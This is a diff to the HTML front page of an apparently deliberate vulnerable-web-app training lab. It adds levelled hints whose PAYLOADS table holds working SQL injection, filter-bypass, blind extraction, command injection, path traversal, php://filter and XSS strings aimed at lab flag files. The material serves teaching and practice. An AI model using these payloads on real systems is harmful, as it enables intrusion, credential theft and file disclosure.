@@ -19,6 +19,8 @@ input[type=text],textarea{flex:1;min-width:200px;padding:8px 10px;border:1px sol
 textarea{min-height:70px;width:100%}
 button{background:var(--brand);color:#fff;border:0;border-radius:7px;padding:8px 13px;cursor:pointer;font-size:.88em}
 button.ghost{background:#1c2330;color:#8ab4ff}button:hover{filter:brightness(1.12)}
+.levels{display:flex;gap:6px;margin:8px 0;flex-wrap:wrap}.lvlbtn{background:#1c2330;color:#8b98a5;font-size:.8em;padding:4px 11px}
+.lvlbtn.on{background:#1f6feb;color:#fff}.note{color:var(--muted);font-size:.85em}
 .res{width:100%;height:200px;border:1px solid var(--line);border-radius:8px;background:#fff;margin-top:8px;display:none}
 .rx{white-space:pre-wrap;background:#05070b;color:var(--ink);border:1px solid var(--line);border-radius:8px;padding:10px;margin-top:8px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;display:none;max-height:200px;overflow:auto}
 .muted{color:var(--muted);font-size:.92em}a{color:#8ab4ff}
@@ -43,15 +45,16 @@ walkthroughs in <code>SOLUTIONS.md</code>. The real pages are still under <a hre
     <input type="text" id="in_lp" name="password" placeholder="password" style="min-width:140px"><button>Login ▶</button></form>
   <iframe name="r_login" id="r_login" class="res"></iframe></div>
 
-<!-- Search: UNION SQLi + reflected XSS -->
-<div class="card"><h2><code>index.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span> <span class="flag-pill">🏁 reflected XSS</span></h2>
-  <p class="muted">Directory search. Dump the users table, or pop an alert.</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_q">' UNION SELECT username,password,role FROM users-- -</code>
-    <button type="button" class="ghost" onclick="fill('in_q','pl_q')">SQLi ▶</button>
-    <code class="pl" id="pl_qx">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
-    <button type="button" class="ghost" onclick="fill('in_q','pl_qx')">XSS ▶</button></details>
+<!-- Search: UNION SQLi (leveled) -->
+<div class="card"><h2><code>index.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
+  <p class="muted">Directory search → dump the <code>users</code> table. The filter gets tougher each level.
+     <span class="note">(reflected XSS also lives here: <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>)</span></p>
+  <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_q"></span></summary>
+    <code class="pl" id="pl_q"></code><button type="button" class="ghost" onclick="fill('in_q','pl_q')">use this ▶</button></details>
   <form method="get" action="index.php" target="r_q" onsubmit="show('r_q')">
-    <input type="text" id="in_q" name="q" placeholder="search payload…"><button>Run ▶</button></form>
+    <input type="hidden" name="level" id="lvl_q" value="easy">
+    <input type="text" id="in_q" name="q" placeholder="your SQLi payload…"><button>Run ▶</button></form>
   <iframe name="r_q" id="r_q" class="res"></iframe></div>
 
 <!-- Guestbook: stored XSS -->
@@ -75,23 +78,25 @@ walkthroughs in <code>SOLUTIONS.md</code>. The real pages are still under <a hre
     <input type="text" id="in_id" name="id" placeholder="a user id…" style="min-width:120px"><button>Run ▶</button></form>
   <iframe name="r_id" id="r_id" class="res"></iframe></div>
 
-<!-- Net Tools: command injection -->
+<!-- Net Tools: command injection (leveled) -->
 <div class="card"><h2><code>tools.php?host=</code> <span class="flag-pill">🏁 command injection</span></h2>
-  <p class="muted">The host is passed to a shell <code>ping</code>. Chain your own command.</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_cmd">127.0.0.1; cat ../private/cmdi_flag.txt</code>
-    <button type="button" class="ghost" onclick="fill('in_cmd','pl_cmd')">use this ▶</button>
-    <span class="muted"> · also <code>| id</code>, <code>$(id)</code></span></details>
+  <p class="muted">The host is passed to a shell <code>ping</code>. Run your own command; the filter escalates.</p>
+  <div class="levels" id="lv_cmd"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('cmd','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('cmd','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('cmd','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('cmd','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_cmd"></span></summary>
+    <code class="pl" id="pl_cmd"></code><button type="button" class="ghost" onclick="fill('in_cmd','pl_cmd')">use this ▶</button></details>
   <form method="get" action="tools.php" target="r_cmd" onsubmit="show('r_cmd')">
+    <input type="hidden" name="level" id="lvl_cmd" value="easy">
     <input type="text" id="in_cmd" name="host" placeholder="host; command…"><button>Run ▶</button></form>
   <iframe name="r_cmd" id="r_cmd" class="res"></iframe></div>
 
-<!-- Page: LFI -->
+<!-- Page: LFI (leveled) -->
 <div class="card"><h2><code>index.php?page=</code> <span class="flag-pill">🏁 LFI / path traversal</span></h2>
-  <p class="muted">Includes <code>pages/&lt;name&gt;</code>. Escape it with <code>../</code> to a file outside the web root.</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_pg">../../lfi_secret/flag.txt</code>
-    <button type="button" class="ghost" onclick="fill('in_pg','pl_pg')">use this ▶</button>
-    <span class="muted"> · system file: pile on <code>../</code> then <code>etc/passwd</code></span></details>
+  <p class="muted">Includes <code>pages/&lt;name&gt;</code>. Read <code>lfi_secret/flag.txt</code> (outside the web root). Filter escalates.</p>
+  <div class="levels" id="lv_pg"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('pg','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('pg','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('pg','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('pg','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_pg"></span></summary>
+    <code class="pl" id="pl_pg"></code><button type="button" class="ghost" onclick="fill('in_pg','pl_pg')">use this ▶</button></details>
   <form method="get" action="index.php" target="r_pg" onsubmit="show('r_pg')">
+    <input type="hidden" name="level" id="lvl_pg" value="easy">
     <input type="text" id="in_pg" name="page" placeholder="file path…"><button>Run ▶</button></form>
   <iframe name="r_pg" id="r_pg" class="res"></iframe></div>
 
@@ -130,6 +135,33 @@ walkthroughs in <code>SOLUTIONS.md</code>. The real pages are still under <a hre
 <script>
 function fill(inputId, plId){ document.getElementById(inputId).value = document.getElementById(plId).textContent; }
 function show(frameId){ document.getElementById(frameId).style.display='block'; }
+const PAYLOADS = {
+ q:{
+  easy:{p:"' UNION SELECT username,password,role FROM users-- -", n:"Easy — raw. Classic UNION dump."},
+  medium:{p:"' UNIunionON SELselectECT username,password,role FROM users-- -", n:"Medium — 'union'/'select' stripped once → nest them (UNIunionON)."},
+  hard:{p:"'/**/UNIunionON/**/SELselectECT/**/username,password,role/**/FROM/**/users#", n:"Hard — + spaces stripped → /**/ for spaces, end with #."},
+  expert:{p:"zzz' OR 1=1-- -", n:"Expert — BLIND (match / no-match). Boolean-extract: ' AND SUBSTRING((SELECT v FROM secrets WHERE k='db_flag'),1,1)='F'-- -"}
+ },
+ cmd:{
+  easy:{p:"127.0.0.1; cat private/cmdi_flag.txt", n:"Easy — raw. Chain with ;"},
+  medium:{p:"127.0.0.1 | cat private/cmdi_flag.txt", n:"Medium — ; and & stripped → use a pipe |"},
+  hard:{p:"127.0.0.1$(cat${IFS}private/cmdi_flag.txt)", n:"Hard — ; & | ` and spaces stripped → $(...) with ${IFS}; the flag appears in the ping error."},
+  expert:{p:"127.0.0.1; cat private/cmdi_flag.txt > uploads/pwn.txt", n:"Expert — BLIND (no output). Write to a readable file, then open /uploads/pwn.txt in a new tab."}
+ },
+ pg:{
+  easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal."},
+  medium:{p:"....//....//lfi_secret/flag.txt", n:"Medium — '../' stripped once → ....// collapses back to ../"},
+  hard:{p:"....//....//lfi_secret/flag.txt", n:"Hard — + must end .txt/.html (this does) → same ....// trick."},
+  expert:{p:"php://filter/convert.base64-encode/resource=../lfi_secret/flag.txt", n:"Expert — traversal blocked; use the php://filter wrapper, then base64-decode the output."}
+ }
+};
+function setLvl(card,lvl){
+  document.getElementById('lvl_'+card).value=lvl;
+  document.getElementById('pl_'+card).textContent=PAYLOADS[card][lvl].p;
+  document.getElementById('note_'+card).textContent=PAYLOADS[card][lvl].n;
+  document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
+}
+['q','cmd','pg'].forEach(function(c){ setLvl(c,'easy'); });
 function doUpload(){
   var out=document.getElementById('r_up'); out.style.display='block'; out.textContent='uploading…';
   var name=document.getElementById('up_name').value||'shell.php';
